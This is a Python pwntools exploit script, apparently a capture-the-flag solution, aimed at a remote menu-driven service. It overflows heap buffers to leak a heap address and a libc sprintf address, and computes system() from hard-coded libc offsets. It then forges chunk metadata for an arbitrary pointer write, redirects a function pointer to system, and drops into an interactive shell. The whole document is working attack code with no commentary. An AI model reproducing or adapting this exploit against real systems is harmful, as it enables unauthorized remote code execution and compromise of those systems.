from pwn import *

#ms = str(316)
ms = str(316)

p = remote("140.113.209.24",11006)
#p = remote("127.0.0.1",11006)

raw_input("Wait")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("first")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline("a"*10)

print p.recv()
p.sendline("1")
print p.recv()
p.sendline("second")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline("B"*(int(ms)-12)+p64(0x603111))

for i in range(1):
    # commit
    print p.recv()
    p.sendline("2")
    print p.recv()
    p.sendline("0")
    print p.recv()
    p.sendline(ms)
    print p.recv()
    #p.send(str(i)*640+"\x8b\x1e\x40\x00\x00\x00\x00")
    p.sendline("X")
    print p.recv()
    p.sendline("A")


print p.recv()
p.sendline("2")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline(ms)
print p.recv()
#p.send(str(i)*640+"\x8b\x1e\x40\x00\x00\x00\x00")
p.sendline("X")
print p.recv()
p.send("A"*61 +"\n")


print p.recv()
p.sendline("4")
sleep(0.2)
print p.recv()
p.sendline("0")
sleep(0.2)

project_addr = p.recv()

print "PROJECT",':'.join(x.encode('hex') for x in "\x10"+project_addr[172:175])
if project_addr[174] == '\x0a':
    project_addr = u64("\x10"+project_addr[172:174]+"\x00"*5)
else:
    project_addr = u64("\x10"+project_addr[172:175]+"\x00"*4)

print hex(project_addr)
mesg_addr = project_addr + 0x5f0
print hex(mesg_addr)

p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline(ms)
print p.recv()
#p.send(str(i)*640+"\x8b\x1e\x40\x00\x00\x00\x00")
#p.sendline("C"*(int(ms)-12)+p64(0))
p.sendline("B"*(int(ms)-12)+p64(0x6030c8))
print p.recv()
p.send("A"*30 +"\n")

print p.recv()
p.sendline("4")
sleep(0.2)
print p.recv()
p.sendline("0")
sleep(0.2)

sprintf_addr = p.recv()
print sprintf_addr[172:178]
print hex(u64(sprintf_addr[172:178]+"\x00"*2))
sprintf_addr = u64(sprintf_addr[172:178]+"\x00"*2)
#libc_sprintf = 0x000050e90
#libc_system = 0x000414f0

libc_sprintf = 0x0000000000054540
libc_system = 0x0000000000046640

get_system = sprintf_addr - libc_sprintf + libc_system

p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline(p64(224+32)+p64(224)+p64(project_addr+7*8)+p64(project_addr+8*8)+"a"*(224-32)+p64(224)+p64(128+48)+"\x00"*71)
print p.recv()
p.send("A"*30 +"\n")

print p.recv()
p.sendline("1")
print p.recv()
p.sendline("third")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline("B"*(int(ms)-12)+p64(0x603111))

#p.interactive()

print p.recv()
p.sendline("5")
sleep(0.2)
print p.recv()
p.sendline("0")
sleep(0.2)

print p.recv()
p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline(p64(0)+p64(1)+p64(0)+p64(0x6030b8)+p64(400));
print p.recv()
p.sendline("A"*30 )

print p.recv()
p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline(ms)
print p.recv()
p.sendline(p64(get_system));
print p.recv()
p.send("A"*30 +"\n")

p.interactive()


